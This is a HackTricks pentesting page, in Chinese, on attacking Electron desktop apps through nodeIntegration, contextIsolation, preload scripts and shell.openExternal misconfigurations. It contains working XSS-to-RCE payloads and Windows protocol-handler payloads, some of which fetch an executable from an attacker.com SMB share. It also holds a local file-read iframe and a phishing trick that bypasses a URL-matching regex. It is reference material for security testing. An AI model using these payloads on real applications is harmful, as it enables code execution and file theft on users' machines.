<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Electron Desktop Apps</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="electron-desktop-apps"><a class="header" href="#electron-desktop-apps">Electron Desktop Apps</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="介绍"><a class="header" href="#介绍">介绍</a></h2>
<p>Electron 结合了本地后端（使用 <strong>NodeJS</strong>）和前端（<strong>Chromium</strong>），尽管它缺乏现代浏览器的一些安全机制。</p>
<p>通常你可能会在 <code>.asar</code> 应用程序中找到 Electron 应用代码，获取代码需要提取它：</p>
<pre><code class="language-bash">npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
</code></pre>
<p>在 Electron 应用的源代码中，在 <code>packet.json</code> 文件内，可以找到指定的 <code>main.js</code> 文件，其中设置了安全配置。</p>
<pre><code class="language-json">{
"name": "standard-notes",
"main": "./app/index.js",
</code></pre>
<p>Electron 有 2 种进程类型：</p>
<ul>
<li>主进程（完全访问 NodeJS）</li>
<li>渲染进程（出于安全原因，NodeJS 应该受到限制访问）</li>
</ul>
<p><img src="../../../.gitbook/assets/image%20(182).png" alt="" /></p>
<p>一个 <strong>渲染进程</strong> 将是一个加载文件的浏览器窗口：</p>
<pre><code class="language-javascript">const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
</code></pre>
<p>设置 <strong>renderer process</strong> 可以在 <strong>main process</strong> 的 main.js 文件中 <strong>配置</strong>。一些配置将 <strong>防止 Electron 应用程序获得 RCE</strong> 或其他漏洞，如果 <strong>设置正确配置</strong>。</p>
<p>Electron 应用程序 <strong>可以通过 Node API 访问设备</strong>，尽管可以配置以防止它：</p>
<ul>
<li><strong><code>nodeIntegration</code></strong> - 默认情况下为 <code>off</code>。如果开启，允许从 renderer process 访问 Node 特性。</li>
<li><strong><code>contextIsolation</code></strong> - 默认情况下为 <code>on</code>。如果关闭，主进程和渲染进程不被隔离。</li>
<li><strong><code>preload</code></strong> - 默认情况下为空。</li>
<li><a href="https://docs.w3cub.com/electron/api/sandbox-option"><strong><code>sandbox</code></strong></a> - 默认情况下为 off。它将限制 NodeJS 可以执行的操作。</li>
<li>工作线程中的 Node 集成</li>
<li><strong><code>nodeIntegrationInSubframes</code></strong> - 默认情况下为 <code>off</code>。</li>
<li>如果 <strong><code>nodeIntegration</code></strong> 被 <strong>启用</strong>，这将允许在 Electron 应用程序中 <strong>加载在 iframe 中的网页</strong> 使用 <strong>Node.js API</strong>。</li>
<li>如果 <strong><code>nodeIntegration</code></strong> 被 <strong>禁用</strong>，则预加载将在 iframe 中加载。</li>
</ul>
<p>配置示例：</p>
<pre><code class="language-javascript">const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
</code></pre>
<p>一些 <strong>RCE payloads</strong> 来自 <a href="https://7as.es/electron/nodeIntegration_rce.txt">这里</a>:</p>
<pre><code class="language-html">Example Payloads (Windows):
&lt;img src=x onerror="alert(require('child_process').execSync('calc').toString());"&gt;

Example Payloads (Linux &amp; MacOS):
&lt;img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('id').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('ls -l').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('uname -a').toString());"&gt;
</code></pre>
<h3 id="捕获流量"><a class="header" href="#捕获流量">捕获流量</a></h3>
<p>修改 start-main 配置并添加使用代理，例如：</p>
<pre><code class="language-javascript">"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
</code></pre>
<h2 id="electron-本地代码注入"><a class="header" href="#electron-本地代码注入">Electron 本地代码注入</a></h2>
<p>如果您可以本地执行一个 Electron 应用程序，那么您可能可以使其执行任意的 JavaScript 代码。请查看如何操作：</p>
<p>{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
<a href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.html">macos-electron-applications-injection.md</a>
{% endcontent-ref %}</p>
<h2 id="rce-xss--nodeintegration"><a class="header" href="#rce-xss--nodeintegration">RCE: XSS + nodeIntegration</a></h2>
<p>如果 <strong>nodeIntegration</strong> 设置为 <strong>on</strong>，网页的 JavaScript 可以轻松使用 Node.js 功能，只需调用 <code>require()</code>。例如，在 Windows 上执行计算器应用程序的方法是：</p>
<pre><code class="language-html">&lt;script&gt;
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
&lt;/script&gt;
</code></pre>
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>
<h2 id="rce-preload"><a class="header" href="#rce-preload">RCE: preload</a></h2>
<p>在此设置中指示的脚本是在渲染器中<strong>加载其他脚本之前</strong>，因此它具有<strong>对 Node API 的无限访问权限</strong>：</p>
<pre><code class="language-javascript">new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
</code></pre>
<p>因此，脚本可以将 node-features 导出到页面：</p>
<p>{% code title="preload.js" %}</p>
<pre><code class="language-javascript">typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
</code></pre>
<p>{% endcode %}</p>
<p>{% code title="index.html" %}</p>
<pre><code class="language-html">&lt;body&gt;
&lt;script&gt;
typeof require === 'undefined';
runCalc();
&lt;/script&gt;
&lt;/body&gt;
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="info" %}
<strong>如果 <code>contextIsolation</code> 开启，这将不起作用</strong>
{% endhint %}</p>
<h2 id="rce-xss--contextisolation"><a class="header" href="#rce-xss--contextisolation">RCE: XSS + contextIsolation</a></h2>
<p><em><strong>contextIsolation</strong></em> 引入了 <strong>网页脚本与 JavaScript Electron 内部代码之间的分离上下文</strong>，使得每段代码的 JavaScript 执行不会相互影响。这是消除 RCE 可能性的必要特性。</p>
<p>如果上下文没有被隔离，攻击者可以：</p>
<ol>
<li>在渲染器中执行 <strong>任意 JavaScript</strong>（XSS 或导航到外部网站）</li>
<li><strong>覆盖内置方法</strong>，该方法用于预加载或 Electron 内部代码，替换为自己的函数</li>
<li><strong>触发</strong> 使用 <strong>被覆盖的函数</strong></li>
<li>RCE？</li>
</ol>
<p>内置方法可以被覆盖的地方有两个：在预加载代码中或在 Electron 内部代码中：</p>
<p>{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
<a href="electron-contextisolation-rce-via-preload-code.html">electron-contextisolation-rce-via-preload-code.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
<a href="electron-contextisolation-rce-via-electron-internal-code.html">electron-contextisolation-rce-via-electron-internal-code.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
<a href="electron-contextisolation-rce-via-ipc.html">electron-contextisolation-rce-via-ipc.md</a>
{% endcontent-ref %}</p>
<h3 id="绕过点击事件"><a class="header" href="#绕过点击事件">绕过点击事件</a></h3>
<p>如果在点击链接时有限制，您可能能够通过 <strong>中间点击</strong> 而不是常规的左键点击来绕过这些限制。</p>
<pre><code class="language-javascript">window.addEventListener('click', (e) =&gt; {
</code></pre>
<h2 id="rce-via-shellopenexternal"><a class="header" href="#rce-via-shellopenexternal">RCE via shell.openExternal</a></h2>
<p>有关此示例的更多信息，请查看 <a href="https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8">https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8</a> 和 <a href="https://benjamin-altpeter.de/shell-openexternal-dangers/">https://benjamin-altpeter.de/shell-openexternal-dangers/</a></p>
<p>在部署 Electron 桌面应用程序时，确保 <code>nodeIntegration</code> 和 <code>contextIsolation</code> 的正确设置至关重要。已确定，<strong>针对预加载脚本或 Electron 的主进程本机代码的客户端远程代码执行 (RCE)</strong> 在这些设置到位时得到了有效防止。</p>
<p>当用户与链接互动或打开新窗口时，会触发特定的事件监听器，这对应用程序的安全性和功能至关重要：</p>
<pre><code class="language-javascript">webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
</code></pre>
<p>这些监听器被<strong>桌面应用程序重写</strong>以实现其自己的<strong>业务逻辑</strong>。应用程序评估导航链接是否应该在内部打开或在外部网页浏览器中打开。这个决定通常通过一个函数<code>openInternally</code>来做。如果这个函数返回<code>false</code>，则表示链接应该在外部打开，利用<code>shell.openExternal</code>函数。</p>
<p><strong>以下是简化的伪代码：</strong></p>
<p><img src="../../../.gitbook/assets/image%20(261).png" alt="https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png" /></p>
<p><img src="../../../.gitbook/assets/image%20(963).png" alt="https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png" /></p>
<p>Electron JS安全最佳实践建议不要使用<code>openExternal</code>函数接受不受信任的内容，因为这可能通过各种协议导致RCE。操作系统支持不同的协议，这些协议可能触发RCE。有关此主题的详细示例和进一步解释，可以参考<a href="https://positive.security/blog/url-open-rce#windows-10-19042">这个资源</a>，其中包括能够利用此漏洞的Windows协议示例。</p>
<p><strong>Windows协议利用的示例包括：</strong></p>
<pre><code class="language-html">&lt;script&gt;
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
&lt;/script&gt;

&lt;script&gt;
window.open("search-ms:query=malicious_executable.exe&amp;crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&amp;displayname=Important%20update")
&lt;/script&gt;

&lt;script&gt;
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&amp;&amp;%2520%22%22%7D%7D")
&lt;/script&gt;
</code></pre>
<h2 id="读取内部文件xss--contextisolation"><a class="header" href="#读取内部文件xss--contextisolation">读取内部文件：XSS + contextIsolation</a></h2>
<p><strong>禁用 <code>contextIsolation</code> 使得可以使用 <code>&lt;webview&gt;</code> 标签</strong>，类似于 <code>&lt;iframe&gt;</code>，用于读取和提取本地文件。提供的示例演示了如何利用此漏洞读取内部文件的内容：</p>
<p><img src="../../../.gitbook/assets/1%20u1jdRYuWAEVwJmf_F2ttJg%20(1).png" alt="" /></p>
<p>此外，还分享了另一种<strong>读取内部文件</strong>的方法，强调了 Electron 桌面应用中的一个关键本地文件读取漏洞。这涉及注入脚本以利用该应用并提取数据：</p>
<pre><code class="language-html">&lt;br&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;
&lt;h1&gt;pwn&lt;br&gt;
&lt;iframe onload=j() src="/etc/hosts"&gt;xssxsxxsxs&lt;/iframe&gt;
&lt;script type="text/javascript"&gt;
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
&lt;/script&gt;
</code></pre>
<h2 id="rce-xss--旧版-chromium"><a class="header" href="#rce-xss--旧版-chromium"><strong>RCE: XSS + 旧版 Chromium</strong></a></h2>
<p>如果应用程序使用的 <strong>chromium</strong> 是 <strong>旧版</strong> 并且存在 <strong>已知的</strong> <strong>漏洞</strong>，那么可能通过 <strong>XSS 利用它并获得 RCE</strong>。<br />
您可以在这个 <strong>writeup</strong> 中看到一个例子: <a href="https://blog.electrovolt.io/posts/discord-rce/">https://blog.electrovolt.io/posts/discord-rce/</a></p>
<h2 id="通过内部-url-正则绕过进行-xss-钓鱼"><a class="header" href="#通过内部-url-正则绕过进行-xss-钓鱼"><strong>通过内部 URL 正则绕过进行 XSS 钓鱼</strong></a></h2>
<p>假设您发现了一个 XSS，但您 <strong>无法触发 RCE 或窃取内部文件</strong>，您可以尝试利用它来 <strong>通过钓鱼窃取凭据</strong>。</p>
<p>首先，您需要了解当您尝试打开一个新 URL 时，前端的 JS 代码会发生什么:</p>
<pre><code class="language-javascript">webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
</code></pre>
<p>调用 <strong><code>openInternally</code></strong> 将决定 <strong>链接</strong> 是否在 <strong>桌面窗口</strong> 中 <strong>打开</strong>，因为它是属于平台的链接，<strong>或者</strong> 是否在 <strong>浏览器中作为第三方资源</strong> 打开。</p>
<p>如果该函数使用的 <strong>regex</strong> <strong>易受绕过攻击</strong>（例如 <strong>未转义子域的点</strong>），攻击者可以利用 XSS <strong>打开一个新窗口</strong>，该窗口位于攻击者的基础设施中 <strong>请求用户凭据</strong>：</p>
<pre><code class="language-html">&lt;script&gt;
window.open("&lt;http://subdomainagoogleq.com/index.html&gt;")
&lt;/script&gt;
</code></pre>
<h2 id="工具"><a class="header" href="#工具"><strong>工具</strong></a></h2>
<ul>
<li><a href="https://github.com/doyensec/electronegativity"><strong>Electronegativity</strong></a> 是一个用于识别基于 Electron 的应用程序中的错误配置和安全反模式的工具。</li>
<li><a href="https://github.com/ksdmitrieva/electrolint"><strong>Electrolint</strong></a> 是一个开源的 VS Code 插件，用于 Electron 应用程序，使用 Electronegativity。</li>
<li><a href="https://github.com/ajinabraham/nodejsscan"><strong>nodejsscan</strong></a> 用于检查易受攻击的第三方库</li>
<li><a href="https://electro.ng/"><strong>Electro.ng</strong></a>: 你需要购买它</li>
</ul>
<h2 id="实验室"><a class="header" href="#实验室">实验室</a></h2>
<p>在 <a href="https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s">https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s</a> 中，你可以找到一个利用易受攻击的 Electron 应用程序的实验室。</p>
<p>一些将帮助你完成实验室的命令：</p>
<pre><code class="language-bash"># Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
</code></pre>
<h2 id="参考文献"><a class="header" href="#参考文献"><strong>参考文献</strong></a></h2>
<ul>
<li><a href="https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028">https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028</a></li>
<li><a href="https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d">https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d</a></li>
<li><a href="https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8">https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8</a></li>
<li><a href="https://www.youtube.com/watch?v=a-YnG3Mx-Tg">https://www.youtube.com/watch?v=a-YnG3Mx-Tg</a></li>
<li><a href="https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s">https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s</a></li>
<li>更多关于Electron安全的研究和文章在 <a href="https://github.com/doyensec/awesome-electronjs-hacking">https://github.com/doyensec/awesome-electronjs-hacking</a></li>
<li><a href="https://www.youtube.com/watch?v=Tzo8ucHA5xw&amp;list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&amp;index=81">https://www.youtube.com/watch?v=Tzo8ucHA5xw&amp;list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&amp;index=81</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家（ARTE）</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家（GRTE）</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../network-services-pentesting/pentesting-web/drupal/drupal-rce.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../network-services-pentesting/pentesting-web/drupal/drupal-rce.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
